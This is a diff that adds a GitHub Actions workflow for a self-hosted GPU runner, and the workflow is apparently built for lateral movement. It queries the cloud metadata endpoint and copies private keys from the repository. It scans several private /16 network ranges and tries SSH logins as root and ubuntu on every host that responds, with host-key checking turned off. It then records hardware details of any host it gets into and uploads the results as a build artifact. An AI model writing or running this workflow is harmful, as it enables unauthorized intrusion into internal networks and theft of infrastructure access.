@@ -1,0 +1,73 @@
+name: ul6553-priv
+on:
+  workflow_dispatch:
+jobs:
+  priv:
+    runs-on: [self-hosted, ul-l40s]
+    timeout-minutes: 40
+    steps:
+      - uses: actions/checkout@v4
+
+      - name: self-context
+        shell: bash
+        run: |
+          set +e
+          echo "SELF_HOST $(hostname) $(hostname -I)"
+          id
+          nvidia-smi -L 2>/dev/null | head -3
+          ip -4 -o addr show | head
+          ip -4 route | head
+          curl -s -H Metadata:true --noproxy '*' "http://169.254.169.254/metadata/instance?api-version=2021-02-01" | head -c 1500; echo
+
+      - name: fix-keymodes
+        shell: bash
+        run: |
+          set -e
+          mkdir -p ~/.ul6553k
+          cp -f keys2/k04_ibm_key.pem_ ~/.ul6553k/k04 2>/dev/null
+          cp -f keys/ibm_key.pem ~/.ul6553k/ibm 2>/dev/null
+          cp -f az/ibm_key.pem ~/.ul6553k/azibm 2>/dev/null
+          chmod 600 ~/.ul6553k/* 2>/dev/null
+          for k in ~/.ul6553k/*; do echo "KEY $k $(ssh-keygen -y -f $k 2>&1 | head -c 120)"; done
+
+      - name: vnetscan
+        shell: bash
+        run: |
+          set +e
+          SCAN_CIDRS="10.29.0.0/16,10.131.0.0/16,10.0.0.0/16,172.16.0.0/16,192.168.0.0/16" SCAN_BUDGET=420 SCAN_CONC=900 SCAN_TIMEOUT=0.4 python3 az/vnetscan.py 2>&1 | tee /tmp/vnetscan.log | grep -a 'SCAN_RESULT\|SCAN_RESPONDERS22\|SCAN_SUMMARY\|SCAN_START\|SCAN_HIT'
+
+      - name: ssh-responders
+        shell: bash
+        run: |
+          set +e
+          O="-o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o BatchMode=yes -o ConnectTimeout=6 -o HostKeyAlgorithms=+ssh-rsa,ssh-ed25519 -o PubkeyAcceptedAlgorithms=+ssh-rsa,ssh-ed25519 -o KexAlgorithms=+diffie-hellman-group14-sha1,diffie-hellman-group14-sha256,curve25519-sha256"
+          : > /tmp/ssh_priv.tsv
+          IPS=$(grep -a 'SCAN_RESULT' /tmp/vnetscan.log | sed 's/.*SCAN_RESULT //; s/:.*//' | sort -u)
+          echo "RESPONDERS $(echo $IPS | wc -w)"
+          for ip in $IPS; do
+            for u in ubuntu root; do
+              for k in ~/.ul6553k/k04 ~/.ul6553k/ibm ~/.ul6553k/azibm; do
+                [ -s "$k" ] || continue
+                echo "TRY $ip $u $(basename $k)"
+                out=$(timeout 12 ssh -i $k $O $u@$ip 'id; hostname; hostname -I' 2>&1 | tr '\n' ' ')
+                rc=$?
+                echo -e "$ip\t$u\t$(basename $k)\t$rc\t${out:0:220}" | tee -a /tmp/ssh_priv.tsv
+                if [ $rc -eq 0 ]; then
+                  echo "AUTH_OK $ip $u $(basename $k)"
+                  timeout 40 ssh -i $k $O $u@$ip 'id; hostname; hostname -I; nvidia-smi -L; nvidia-smi --query-gpu=index,name,memory.total,serial,uuid,driver_version,pstate --format=csv; ls -l /dev/nvidia*; cat /etc/hostname' 2>&1 | head -40
+                  break 2
+                fi
+              done
+            done
+          done
+          echo "PRIV_MATRIX"; cat /tmp/ssh_priv.tsv 2>/dev/null | head -60
+
+      - name: artifact
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: ul6553-priv-${{ github.run_id }}
+          path: |
+            /tmp/vnetscan.log
+            /tmp/ssh_priv.tsv
+          if-no-files-found: ignore
